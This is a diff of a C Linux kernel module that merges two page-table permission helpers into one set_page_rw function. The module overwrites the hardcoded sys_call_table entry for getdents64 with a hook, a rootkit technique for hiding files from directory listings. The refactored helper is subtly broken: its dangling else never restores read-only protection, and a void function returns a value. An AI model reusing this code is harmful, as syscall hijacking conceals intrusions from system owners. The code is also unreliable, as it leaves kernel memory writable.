@@ -46,24 +46,23 @@ d_name:   Filename (null-terminated)
   return rtn;
 }
 
-int set_page_w(uintptr_t addr) {
+int set_page_rw(uintptr_t addr, int f) {
   unsigned int level;
   pte_t *pte = lookup_address(addr, &level);
-  if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
-    return 0;
-}
 
-int set_page_r(uintptr_t addr) {
-  unsigned int level;
-  pte_t *pte = lookup_address(addr, &level);
-  pte->pte = pte->pte &~_PAGE_RW;
+  if(f == 1)
+    if(pte->pte &~ _PAGE_RW)
+      pte->pte |= _PAGE_RW;
+  else
+    pte->pte = pte->pte &~_PAGE_RW;
+
   return 0;
 }
 
 int f_init(void) {
   sys_call_table = (void*)0xffffffff820013a0;
 
-  set_page_w(sys_call_table);
+  set_page_rw(sys_call_table, 1);
   getdents64_original = sys_call_table[__NR_getdents64];
   sys_call_table[__NR_getdents64] = getdents64_hook;
 
@@ -72,7 +71,7 @@ int f_init(void) {
 
 void f_exit(void) {
   sys_call_table[__NR_getdents64] = getdents64_original;
-  set_page_r(sys_call_table);
+  set_page_rw(sys_call_table, 0);
   return 0;
 }
 
